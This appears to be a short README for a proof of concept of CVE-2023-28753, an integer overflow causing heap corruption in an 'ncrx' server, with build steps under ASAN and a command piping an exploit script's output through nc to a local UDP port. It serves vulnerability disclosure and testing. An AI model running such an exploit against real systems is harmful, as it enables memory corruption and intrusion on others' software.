# CVE-2023-28753
An integer overflow vulnerability that potentially leads to heap memory corruption.


# To demonstrate the heap corruption:

build the ncrx server with ASAN
```
make
./ncrx 31337
```

advasarial client
```
python exploit.py -g | nc -u 127.0.0.1 31337
```
